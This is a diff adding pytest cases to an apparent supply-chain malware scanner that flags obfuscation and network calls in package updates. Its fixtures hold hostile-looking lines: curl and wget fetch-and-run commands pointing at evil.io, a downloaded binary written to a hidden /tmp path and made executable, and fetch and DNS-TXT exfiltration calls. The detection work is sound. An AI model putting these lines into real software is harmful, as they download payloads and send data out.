@@ -2255,3 +2255,157 @@ def test_build_diff_cursorrules_clean_not_flagged(tmp_path):
     )
     _, _, _, _, _, _, _, obfuscated = _build_diff(old, new)
     assert obfuscated is False
+
+
+# ---------------------------------------------------------------------------
+# PHP array_map('chr', ...) obfuscation (Laravel Lang variant)
+# ---------------------------------------------------------------------------
+
+
+def test_has_obfuscation_php_array_map_chr(tmp_path):
+    """array_map('chr', [...]) char-code domain construction is detected."""
+    f = tmp_path / "helper.php"
+    f.write_text(
+        "<?php $domain = implode(array_map('chr', [101, 118, 105, 108, 46, 99, 111])); ?>"
+    )
+    assert _has_obfuscation(f, ".php") is True
+
+
+def test_has_obfuscation_php_array_map_chr_double_quotes(tmp_path):
+    """array_map(\"chr\", ...) with double quotes is also detected."""
+    f = tmp_path / "bootstrap.php"
+    f.write_text('<?php $h = array_map("chr", [102, 111, 111]); ?>')
+    assert _has_obfuscation(f, ".php") is True
+
+
+# ---------------------------------------------------------------------------
+# Ruby HOME redirect and hidden binary write (GemStuffer pattern)
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_ruby_home_redirect(tmp_path):
+    """ENV['HOME'] = '/tmp/...' in a Ruby library file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/setup.rb": (
+                "ENV['HOME'] = '/tmp/gemhome'\n"
+                "FileUtils.mkdir_p('/tmp/gemhome/.gem')\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_ruby_hidden_binary_tmp(tmp_path):
+    """File.binwrite to a hidden /tmp path sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/fetch.rb": "File.binwrite('/tmp/.sshd', response.body)\nFile.chmod(0755, '/tmp/.sshd')\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_ruby_home_redirect():
+    assert _added_lines_have_net_calls(["ENV['HOME'] = '/tmp/evil'"], ".rb") is True
+
+
+def test_added_lines_have_net_calls_ruby_binwrite():
+    assert _added_lines_have_net_calls(["File.binwrite('/tmp/.daemon', data)"], ".rb") is True
+
+
+# ---------------------------------------------------------------------------
+# PHP shell_exec/passthru/popen with curl/wget (Intercom PHP, Mini Shai-Hulud)
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_php_shell_exec_curl(tmp_path):
+    """shell_exec('curl ...') in a PHP file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"src/Installer.php": "<?php $result = shell_exec('curl -skL https://evil.io/setup.sh');\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_php_passthru_wget(tmp_path):
+    """passthru('wget ...') in a PHP file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"src/Bootstrap.php": "<?php passthru('wget https://evil.io/payload -O /tmp/.x'); ?>\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_php_shell_exec():
+    assert _added_lines_have_net_calls(["shell_exec('curl -skL https://evil.io/payload')"], ".php") is True
+    assert _added_lines_have_net_calls(["passthru('wget https://evil.io/bin')"], ".php") is True
+    assert _added_lines_have_net_calls(["$html = file_get_contents($url)"], ".php") is False
+
+
+# ---------------------------------------------------------------------------
+# Go exec.Command subprocess execution (BufferZoneCorp, Go Decimal attack)
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_go_exec_command(tmp_path):
+    """exec.Command in a Go library file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "internal/runner.go": (
+                'package main\nimport "os/exec"\n'
+                'func run(cmd string) { exec.Command("sh", "-c", cmd).Run() }\n'
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_go_exec_command():
+    assert _added_lines_have_net_calls(['exec.Command("bash", "-c", payload).Run()'], ".go") is True
+    assert _added_lines_have_net_calls(['exec.Command("curl", url).Output()'], ".go") is True
+    assert _added_lines_have_net_calls(["result := compute(x)"], ".go") is False
+
+
+# ---------------------------------------------------------------------------
+# .cjs file extension coverage (node-ipc evasion tactic)
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_in_cjs_file(tmp_path):
+    """dns.resolveTxt in a new .cjs file sets network_calls_in_lib (node-ipc pattern)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/phone-home.cjs": "const dns = require('dns');\ndns.resolveTxt('bt.node.cjs', cb);\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_cjs_fetch(tmp_path):
+    """fetch() in a new .cjs file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/exfil.cjs": "fetch('https://api.telegram.org/bot123/sendMessage', opts);\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_cjs():
+    assert _added_lines_have_net_calls(["dns.resolveTxt('c2.evil.io', cb)"], ".cjs") is True
+    assert _added_lines_have_net_calls(["fetch('https://evil.io/exfil', opts)"], ".cjs") is True
+    assert _added_lines_have_net_calls(["const result = compute(x);"], ".cjs") is False
